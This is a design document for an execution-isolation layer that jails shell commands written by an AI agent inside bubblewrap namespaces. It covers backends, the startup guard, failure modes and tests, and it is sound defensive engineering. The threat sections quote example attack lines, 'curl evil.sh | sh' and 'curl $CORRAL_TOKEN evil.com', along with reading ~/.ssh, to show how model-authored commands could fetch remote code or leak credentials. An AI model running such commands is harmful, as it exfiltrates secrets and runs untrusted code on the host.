# Execution Isolation — Design (sub-project #11)

**Status:** design · **Date:** 2026-06-29

## Where this fits

Sub-project #10 gave bees `run_command` so they execute real artifacts instead
of narrating. Its security story was: *"the in-process guardrails are weak; the
real boundary is the agent's container."* That holds **only when the bee runs in
a locked-down container** — and `corral-agent` is a thin client that can run
anywhere (a dev laptop, a CI runner, a shared host). On a live system,
`AGENT_ALLOW_EXEC=1` hands the model `sh -c` on that machine, and the timeout /
output-cap / minimal-env do nothing against `curl evil.sh | sh` or reading
`~/.ssh`. The gate is also too blunt: it can't tell a disposable container from
someone's workstation, so the dangerous mode is reachable by accident.

#11 makes execution **structurally safe regardless of where the bee runs**: the
runner provides its own OS-level isolation boundary instead of inheriting one,
and refuses to run untrusted commands when it can't.

This supersedes the "isolation boundary is the container" framing in
[2026-06-29-execution-sandbox-design.md](2026-06-29-execution-sandbox-design.md):
the container becomes the *outer* boundary; the runner now adds an *inner* one.

## First principle: jail the command, not the bee

The single most important distinction. There are **two trust tiers**, and the
boundary sits *between* them — never around the bee:

| | Trust | Network | MCP to brain | `CORRAL_TOKEN` | Research tools |
|---|---|---|---|---|---|
| **The bee** (`corral-agent`) | trusted client | full | yes | yes | yes |
| **`run_command`'s subprocess** | untrusted (model-authored) | off by default | no | never | n/a |

The bee process runs **completely unjailed** — it keeps full network, its MCP
session to the brain, its token, and all research/RAG/web tools. Isolation wraps
*only* the `sh -c` that `run_command` spawns. Consequences:

- **Research** (reading docs, querying the reference RAG, web fetch, talking to
  the brain) flows through the bee's own tools and MCP session — untouched.
- **`run_command`** is only for building/running/testing the artifact the bee
  produced. That subprocess is the only thing that gets net-off + token-free +
  fs-confined.

This is the whole point: the bee needs the network and the token to be useful;
the untrusted command it generates must never inherit them — otherwise a
model-authored `curl $CORRAL_TOKEN evil.com` walks your credentials out.

## Architecture

Turn `internal/sandbox` into a pluggable runner. A new `Isolator` backend sits
behind the **existing** `Run(ctx, command, opts) Result` signature, so dispatch
in `cmd/corral-agent` is unchanged in shape — it still calls `sandbox.Run`. The
backend is resolved and **preflighted once at agent startup**; nothing executes
until that passes.

```
agent startup (AGENT_ALLOW_EXEC=1)
  → resolve backend (default bwrap)        ── reject `none` unless unsafe override
  → Isolator.Preflight()                   ── on failure: exec DISABLED, loud, actionable
run_command(cmd)
  → sandbox.Run(ctx, cmd, Options{Workspace, Network})
      → Isolator.Wrap(cmd, opts) → argv     ── bwrap/container/none builds the wrapped argv
      → exec argv under existing guardrails  ── pgid-kill timeout, output cap, minimal env
  → Result{exit_code, output, timed_out, err}
```

## Components

### 1. `Isolator` interface (`internal/sandbox`)

```go
type Isolator interface {
    // Wrap returns the argv that runs `command` under isolation, given the
    // workspace and options (e.g. network on/off). It does NOT exec.
    Wrap(command string, opts Options) (argv []string, err error)
    // Preflight verifies the backend can actually isolate on THIS host.
    Preflight() error
    // Name is the backend's identifier for logs/errors ("bwrap", "container", "none").
    Name() string
}
```

`Run()` keeps its current responsibilities (timeout via `exec.CommandContext`,
process-group kill, `WaitDelay`, output cap, `MinimalEnv`) and now execs the
**wrapped** argv from `Wrap` rather than a bare `sh -c`. `Options` gains
`Network bool` (default false) and `Backend Isolator` (resolved at startup and
threaded in; `nil` means exec is disabled and `Run` returns the refusal error).

### 2. `bwrap` backend — default, built now (Linux)

`Wrap` produces a [bubblewrap](https://github.com/containers/bubblewrap) argv:

- `--unshare-all` (user, pid, ipc, uts, cgroup namespaces) — a fresh user
  namespace means the command has **no privileged capabilities**.
- `--unshare-net` **unless** `opts.Network` — network off by default.
- `--clearenv`, then the command's minimal env is passed explicitly (the bee's
  secrets never enter; this double-guards `MinimalEnv`).
- `--ro-bind /usr /usr`, `--ro-bind /bin /bin`, `--ro-bind /lib /lib`,
  `--ro-bind /lib64 /lib64` (whichever exist), `--proc /proc`, `--dev /dev`,
  `--tmpfs /tmp` — a minimal read-only root.
- `--bind <workspace> <workspace>` + `--chdir <workspace>` — the workspace is
  the **only** writable path.
- `--die-with-parent`, `--new-session`.
- When `opts.Network` is set: drop `--unshare-net` and add
  `--ro-bind /etc/resolv.conf /etc/resolv.conf` so DNS resolves.

`Preflight` runs `bwrap --version` **and** a trivial `bwrap --unshare-all true`
— the second proves unprivileged user namespaces are actually enabled (some
hardened/old kernels compile them out; a version check alone would pass and then
every real command would fail).

### 3. `container` backend — documented, follow-up

Same interface, `Wrap` produces a `podman run` (or `docker run`) argv:
`run --rm --network=none --read-only --cap-drop=ALL --pids-limit=<n>
--memory=<m> -v <ws>:<ws>:Z -w <ws> <image> sh -c <command>` (drop
`--network=none` when `opts.Network`). `Preflight` checks the runtime is present
and can run a throwaway container. Stronger and more portable than bwrap (fresh
kernel-isolated-ish rootfs per command) at ~hundreds of ms per call. **Not built
in this sub-project** — specced so the pluggable interface is proven against a
second backend and so reviewers see the upgrade path is a drop-in.

### 4. `none` backend — explicit + unsafe only

Today's raw `sh -c` (no wrapping). Selectable **only** when both
`AGENT_EXEC_BACKEND=none` **and** `AGENT_EXEC_UNSAFE_HOST=1` are set. Resolving
`none` without the override is a hard error at startup. `Preflight` always
succeeds but logs a loud warning naming the host. This is the deliberate "I have
already hardened this container myself" path — it is **never** auto-selected and
**never** a fallback (see Failure modes).

### 5. Startup guard (`cmd/corral-agent`)

When `AGENT_ALLOW_EXEC=1`:

1. Resolve the backend from `AGENT_EXEC_BACKEND` (default `bwrap`). `none`
   requires `AGENT_EXEC_UNSAFE_HOST=1` or resolution fails.
2. Call `Preflight()`. **On failure, exec stays disabled** — the agent logs the
   reason loudly and continues doing text-only work. `run_command` then returns
   an actionable error, e.g.:
   `execution unavailable: bwrap preflight failed (user namespaces disabled?).
   Install bubblewrap, or set AGENT_EXEC_BACKEND=container, or run the agent in
   a disposable container with AGENT_EXEC_BACKEND=none AGENT_EXEC_UNSAFE_HOST=1.
   Refusing to run untrusted commands unprotected.`
3. On success, store the resolved `Isolator` on the dispatcher; `run_command`
   passes it through `Options.Backend`.

## Configuration (all agent-side env)

| Var | Default | Meaning |
|---|---|---|
| `AGENT_ALLOW_EXEC` | `0` | Master gate for `run_command` (unchanged from #10). |
| `AGENT_EXEC_BACKEND` | `bwrap` | `bwrap` \| `container` \| `none`. |
| `AGENT_EXEC_NET` | `0` | Per-agent default for command network access (`Options.Network`). |
| `AGENT_EXEC_UNSAFE_HOST` | `0` | Required to select `none`. No other effect. |

## Failure modes (resiliency-first)

- **Backend preflight fails** → exec disabled, loud, actionable error; agent
  still runs (text-only). **No automatic fallback to a weaker backend** — that
  is the "Refuse" decision; silent degradation is the exact trap we are closing.
- **bwrap present but userns disabled** → caught by the trivial-run probe in
  `Preflight` → refuse.
- **`none` selected without `AGENT_EXEC_UNSAFE_HOST=1`** → startup error,
  exec disabled.
- **`opts.Network` requested but backend can't honor it** → `Wrap` errors;
  never silently run with the network when net-off was expected (or vice versa).
- **Missing/!exist workspace** → error before exec.
- Timeout / pgid-kill / output-cap / secret-free env are unchanged from #10 and
  still apply to the wrapped argv.

## Testing

- **argv construction (no bwrap needed):** unit-test `bwrapIsolator.Wrap` —
  `--unshare-net` present by default and absent when `Network=true`;
  `--clearenv` present; `--bind <workspace>` + `--chdir <workspace>` present;
  resolv.conf bound only when networked.
- **live bwrap (gated `t.Skip` if `bwrap`/userns absent):** net-off proven (a
  command that resolves/reaches a host fails when net is off, succeeds with
  `Network=true`); fs-RO proven (write outside the workspace fails, write inside
  succeeds); cwd is the workspace; the parent's `CORRAL_TOKEN` is invisible.
- **startup guard / refuse path (no bwrap):** a fake `Isolator` whose
  `Preflight` errors → the guard disables exec → `run_command` returns the
  refusal error (dispatch-level test).
- **backend resolution:** `none` without the unsafe override is rejected;
  `none` with both env vars resolves; unknown backend name errors.
- Existing `internal/sandbox` guardrail tests and `cmd/corral-agent` dispatch
  tests continue to pass unchanged.

## Demo wiring

- Add `bubblewrap` to `deploy/demo/Dockerfile.agent-exec` so the exec demo has a
  real inner jail. The container remains the outer boundary; bwrap is the inner
  one (defense in depth).
- Defaults in the mission profile: `AGENT_EXEC_BACKEND=bwrap`, net off. A build
  step that needs deps flips `AGENT_EXEC_NET=1` (or vendors them).

## Honest framing (what a reviewer will check)

- **bwrap shares the host kernel.** It stops casual damage, network
  exfiltration, and filesystem escape — **not** a kernel-exploit container
  escape. For genuinely adversarial code, use the `container` backend, a
  microVM, or a remote executor pool; the pluggable `Isolator` makes that a
  drop-in with no agent change.
- The finding "the agent runs untrusted code on a live host" **no longer
  applies**: the default actually jails, raw exec is unreachable without two
  deliberate env vars, and a host that can't jail **refuses** rather than
  degrades.
- The bee itself is never sandboxed, so nothing about this reduces its ability
  to reach the brain, do research, or use its token — the boundary is strictly
  around model-authored commands.

## Out of scope (follow-ups)

- The `container` and `remote` backends (interface is ready; only `bwrap` ships).
- seccomp-bpf syscall filtering (`bwrap --seccomp`) and rlimit/cgroup resource
  caps beyond `--unshare-all`.
- Per-command network allowlists / egress proxy (today it is all-or-nothing via
  `AGENT_EXEC_NET`).
- macOS/Windows isolation backends (bwrap is Linux-only; non-Linux hosts must
  use `container` or the explicit unsafe path).
